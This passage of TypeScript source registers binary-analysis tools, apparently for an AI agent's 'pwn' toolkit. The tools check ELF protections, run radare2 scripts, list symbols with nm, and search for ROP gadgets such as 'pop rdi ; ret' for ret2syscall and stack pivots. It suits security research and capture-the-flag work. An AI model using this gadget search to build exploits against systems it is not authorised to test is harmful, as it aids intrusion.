          out.push("NX/GNU_STACK: " + (line.includes("RW ") && !line.includes("E") ? "✅ NX 启用（栈不可执行）" : "⚠️  栈可能可执行（RWE）"));
        }
        // PIE / DYN
        const pie = readelfL.stdout.match(/Type:\s*\w+/);
        out.push(
          "Type / PIE: " +
            (pie ? pie[0] : "") +
            (readelfL.stdout.includes("(DYN)")
              ? " → DYN 类型 ≈ PIE 可能已启用"
              : readelfL.stdout.includes("(EXEC)")
              ? " → EXEC 类型 = 未启用 PIE"
              : "")
        );
        // RELRO
        const relro = readelfL.stdout.includes("GNU_RELRO");
        const bindNow = (readelfD.stdout || "").includes("BIND_NOW");
        out.push(
          "RELRO: " +
            (relro ? (bindNow ? "✅ Full RELRO" : "🟡 Partial RELRO") : "❌ No RELRO")
        );
      }
      // Canary
      if (symbols.status === 0) {
        out.push(
          "Stack Canary: " +
            ((symbols.stdout || "").includes("__stack_chk_fail")
              ? "✅ 检测到 __stack_chk_fail（Canary 启用）"
              : "❌ 未检测到 Canary 符号")
        );
      }
      // RPATH / RUNPATH
      if (readelfD.status === 0) {
        const rpath = (readelfD.stdout.match(/RPATH[^\n]*/) || [])[0];
        const runpath = (readelfD.stdout.match(/RUNPATH[^\n]*/) || [])[0];
        if (rpath) out.push("RPATH: " + rpath.trim());
        if (runpath) out.push("RUNPATH: " + runpath.trim());
        if (!rpath && !runpath) out.push("RPATH/RUNPATH: 未设置（安全）");
        if (readelfD.stdout.includes("FORTIFY_SOURCE") || (readelfS.stdout || "").includes("_chk@"))
          out.push("FORTIFY: 可能启用（检测到 _chk 系列符号）");
      }

      return out.join("\n");
    },
  });

  registry.register({
    name: "pwn_radare2",
    description:
      "专业反汇编软件 Radare2（r2）集成：aaa 完整分析后可反汇编函数、列符号字符串等。输出准确性比 objdump 高（识别 syscall/switch/PLT 跳转等）。系统无 r2 时给出安装命令。",
    parameters: z.object({
      path: z.string().describe("二进制路径"),
      commands: z
        .string()
        .default("aaa; afl; pdf @ main")
        .describe(
          "r2 脚本命令，多个用 ; 分隔。常用：aaa=分析;afl=所有函数列表;pdf@main=反汇编 main;iz=字符串;ii=导入表;ie=入口;axf=xrefs;aha=函数直方图;agf=控制流图"
        ),
      maxLines: z.number().min(100).max(10000).default(3000).describe("输出行数限制"),
    }),
    category: "pwn",
    concurrent: true,
    requirePermission: true,
    execute: async (args: any) => {
      const { path, commands, maxLines } = args;
      if (!fs.existsSync(path)) return `❌ 文件不存在: ${path}`;
      const { spawnSync } = require("child_process") as typeof import("child_process");
      const which = spawnSync("which", ["r2"], { timeout: 3000, encoding: "utf-8" });
      if (which.status !== 0 || !which.stdout.trim()) {
        return (
          `⚠️  系统未安装 Radare2 (r2)。安装方式：\n` +
          `  macOS: brew install radare2\n` +
          `  Ubuntu: sudo apt install radare2  或  git+官方脚本（sys/install.sh）\n` +
          `  Fedora: sudo dnf install radare2\n` +
          `  也可先用 pwn_objdump(path, mode=\"disasm-func\", symbol=\"main\") 获得 objdump 基础反汇编。`
        );
      }

      // radare2 脚本模式：r2 -q -c "cmd1;cmd2" path
      const r = spawnSync("r2", ["-q", "-c", commands, path], {
        timeout: 120000, // aaa 对大型二进制可能较久
        encoding: "utf-8",
        maxBuffer: 20 * 1024 * 1024,
      });
      let stdout = r.stdout || "";
      const lines = stdout.split("\n");
      let truncated = "";
      if (lines.length > maxLines) {
        truncated = `\n... (输出 ${lines.length} 行，仅展示前 ${maxLines} 行，请缩小 commands 范围)`;
        stdout = lines.slice(0, maxLines).join("\n");
      }
      const head = `[pwn_radare2 commands=\"${commands}\"]\n`;
      if (r.status !== 0) {
        const err = r.stderr || "(无 stderr)";
        return head + `❌ r2 异常退出 code=${r.status}\nSTDERR: ${err.slice(0, 1200)}\nSTDOUT:\n${stdout.slice(0, 2000)}`;
      }
      return head + stdout + truncated;
    },
  });

  registry.register({
    name: "pwn_rop_gadget",
    description:
      "搜索 ROP gadget：优先 ROPgadget 工具（pwntools 推荐）；其次 ropper；最后 objdump + grep 降级搜索 pop/ret/syscall 等。用于 ret2syscall/ret2csu/stack pivot 等构造。",
    parameters: z.object({
      path: z.string().describe("ELF 二进制 / libc.so.6"),
      filter: z
        .string()
        .optional()
        .describe(
          "过滤条件：ROPgadget 时传 --only 'pop|ret' 等价；objdump 降级时作为 grep 关键词（如 'pop rdi ; ret'、'syscall'、'leave ; ret'）。留空返回常见 gadget 列表。"
        ),
      maxGadgets: z.number().min(50).max(5000).default(500),
    }),
    category: "pwn",
    concurrent: true,
    requirePermission: true,
    execute: async (args: any) => {
      const { path, filter, maxGadgets } = args;
      if (!fs.existsSync(path)) return `❌ 文件不存在: ${path}`;
      const { spawnSync } = require("child_process") as typeof import("child_process");
      const out: string[] = [];

      const whichRG = spawnSync("which", ["ROPgadget"], { timeout: 3000, encoding: "utf-8" });
      if (whichRG.status === 0 && whichRG.stdout.trim()) {
        const cmd: string[] = ["--binary", path];
        if (filter) cmd.push("--only", filter);
        const r = spawnSync("ROPgadget", cmd, {
          timeout: 60000,
          encoding: "utf-8",
          maxBuffer: 20 * 1024 * 1024,
        });
        if (r.status === 0) {
          const lines = r.stdout.split("\n");
          const nonEmpty = lines.filter((l) => l.includes(" : ") || l.includes("0x"));
          out.push(
            `✅ ROPgadget 结果共 ${nonEmpty.length} 条（展示前 ${maxGadgets} 条）：`
          );
          for (const l of nonEmpty.slice(0, maxGadgets)) out.push("  " + l.trim());
          if (nonEmpty.length > maxGadgets)
            out.push(`  ...(${nonEmpty.length - maxGadgets} 条被截断，请传 filter 缩小范围)`);
          return out.join("\n");
        } else {
          out.push(
            `⚠️  ROPgadget 异常 code=${r.status}, stderr=${(r.stderr || "").slice(0, 400)}; fallback`
          );
        }
      }

      const whichRP = spawnSync("which", ["ropper"], { timeout: 3000, encoding: "utf-8" });
      if (whichRP.status === 0 && whichRP.stdout.trim()) {
        const cmd: string[] = ["--file", path, "--nocolor"];
        if (filter) cmd.push("--filter", filter);
        const r = spawnSync("ropper", cmd, {
          timeout: 60000,
          encoding: "utf-8",
          maxBuffer: 20 * 1024 * 1024,
        });
        if (r.status === 0) {
          const lines = (r.stdout || "").split("\n");
          const nonEmpty = lines.filter((l) => /0x[0-9a-fA-F]+/.test(l));
          out.push(`✅ ropper 结果共 ${nonEmpty.length} 条（前 ${maxGadgets}）:`);
          for (const l of nonEmpty.slice(0, maxGadgets)) out.push("  " + l.trim());
          return out.join("\n");
        } else {
          out.push(`⚠️  ropper 异常 code=${r.status}; fallback`);
        }
      }

      // Fallback: objdump -d + grep 常用 gadget
      out.push(
        "ℹ️  ROPgadget/ropper 均未安装。建议: pip install ROPgadget ropper。Fallback 到 objdump -d + grep。"
      );
      const patterns = filter
        ? [filter]
        : [
            "pop rdi ; ret",
            "pop rsi ; pop r15 ; ret",
            "pop rdx ; ret",
            "pop rax ; ret",
            "syscall",
            "leave ; ret",
            "pop rbp ; ret",
            "ret",
          ];
      const od = spawnSync("objdump", ["-d", "-M", "intel", path], {
        timeout: 30000,
        encoding: "utf-8",
        maxBuffer: 20 * 1024 * 1024,
      });
      if (od.status !== 0) {
        return out.join("\n") + "\n❌ objdump fallback 也失败：" + (od.stderr || "").slice(0, 600);
      }
      const asm = od.stdout;
      let totalShown = 0;
      for (const p of patterns) {
        // 找 asm 中 "addr:  bytes    instr1; instr2" 行与 instr 子串匹配
        const regex = new RegExp(
          "([0-9a-fA-F]+):\\s+[0-9a-fA-F ]+\\s+(.+\\b" +
            p.replace(/[.*+?^${}()|[\]\\]/g, "\\$&").split(/\s*;\s*/).join(".*") +
            "\\b.*)",
          "g"
        );
        const matches: Array<[string, string]> = [];
        let m: RegExpExecArray | null;
        while ((m = regex.exec(asm)) != null) {
          matches.push([m[1], m[2].trim()]);
          if (matches.length >= 20) break;
        }
        if (matches.length > 0) {
          out.push(`\n匹配 "${p}":`);
          for (const [addr, instr] of matches) {
            out.push(`  0x${addr}: ${instr}`);
            totalShown++;
            if (totalShown >= maxGadgets) break;
          }
        }
        if (totalShown >= maxGadgets) break;
      }
      if (totalShown === 0) out.push("  (Fallback grep 没命中；建议安装 ROPgadget)");
      return out.join("\n");
    },
  });

  registry.register({
    name: "pwn_nm",
    description:
      "nm/readelf --syms 提取完整符号表：所有函数地址、全局变量、导入符号、weak 符号。比 pwn_static_analysis 内置扫描更全，用于定位 win/vuln/system/puts@plt 等关键地址。",
    parameters: z.object({
      path: z.string().describe("二进制路径"),
      scope: z
        .enum(["all", "defined-only", "undefined-only", "functions-only", "objects-only"])
        .default("all")
        .describe(
          "范围：all=全部 / defined-only=已定义 / undefined-only=未定义（导入） / functions-only=仅函数 / objects-only=仅变量"
        ),
      demangle: z.boolean().default(true).describe("是否 C++ demangle（默认 true）"),
      grep: z.string().optional().describe("关键词大小写不敏感过滤，如 'win|system|plt'"),
      maxLines: z.number().min(50).max(5000).default(1500),
    }),
    category: "pwn",
    concurrent: true,
    requirePermission: true,
    execute: async (args: any) => {
      const { path, scope, demangle, grep, maxLines } = args;
      if (!fs.existsSync(path)) return `❌ 文件不存在: ${path}`;
      const { spawnSync } = require("child_process") as typeof import("child_process");

      // 优先 nm -C（全符号，含本地）；否则 readelf --syms
      const which = spawnSync("which", ["nm"], { timeout: 3000, encoding: "utf-8" });
      const header = `[pwn_nm scope=${scope}]`;
      let raw: string = "";
      let stderr: string = "";
      let source: "nm" | "readelf" = "nm";

      if (which.status === 0 && which.stdout.trim()) {
        const nmArgs: string[] = [];
        if (demangle) nmArgs.push("-C");
        if (scope === "defined-only") nmArgs.push("--defined-only");
        if (scope === "undefined-only") nmArgs.push("--undefined-only");
        nmArgs.push(path);
        const r = spawnSync("nm", nmArgs, { timeout: 15000, encoding: "utf-8", maxBuffer: 10 * 1024 * 1024 });
        raw = r.stdout || "";
        stderr = r.stderr || "";
        if (r.status !== 0) {
          source = "readelf";
        }
      } else {
        source = "readelf";
      }
      if (source === "readelf") {
        const r = spawnSync("readelf", ["-s", "-W", path], {
          timeout: 15000,
          encoding: "utf-8",
          maxBuffer: 10 * 1024 * 1024,
        });
        raw = r.stdout || "";
        stderr += (r.stderr || "");
      }

      // 作用域后置过滤（nm 不支持 functions-only）
      let lines = raw.split("\n");
      if (scope === "functions-only") {
        lines = lines.filter((l) => /^\s*[0-9a-fA-F]+\s+[TtWw]\s+/.test(l));
      } else if (scope === "objects-only") {
        lines = lines.filter((l) => /^\s*[0-9a-fA-F]+\s+[BbDdRrVvNn?SsCc]\s+/.test(l));
      }
      if (grep) {
        try {
          const re = new RegExp(grep, "i");
          lines = lines.filter((l) => re.test(l));
        } catch {
          lines = lines.filter((l) => l.toLowerCase().includes(grep.toLowerCase()));
        }
      }

      let truncated = "";
      if (lines.length > maxLines) {
        truncated = `\n... 共 ${lines.length} 行，截断前 ${maxLines}。可缩小 scope / 加 grep="win|main|system@plt" 过滤。`;
        lines = lines.slice(0, maxLines);
      }

      return (
        header +
        ` (source=${source})` +
        "\n" +
        lines.join("\n") +
        truncated +
        (stderr ? `\n[STDERR] ${stderr.slice(0, 500)}` : "")
      );
    },
  });

  return registry;
}

// 辅助：Buffer 的 repr 化（类似 Python repr，能看到 \xNN 而非乱码）
function reprBuffer(buf: Buffer): string {
  let out = "";
  for (const b of buf) {
    if (b === 0x0a) out += "\\n";
    else if (b === 0x0d) out += "\\r";
    else if (b === 0x09) out += "\\t";
    else if (b === 0x5c) out += "\\\\";
    else if (b === 0x22) out += '\\"';
    else if (b === 0x27) out += "\\'";
    else if (b >= 0x20 && b <= 0x7e) out += String.fromCharCode(b);
    else out += "\\x" + b.toString(16).padStart(2, "0");
  }
  return "'" + out + "'";
}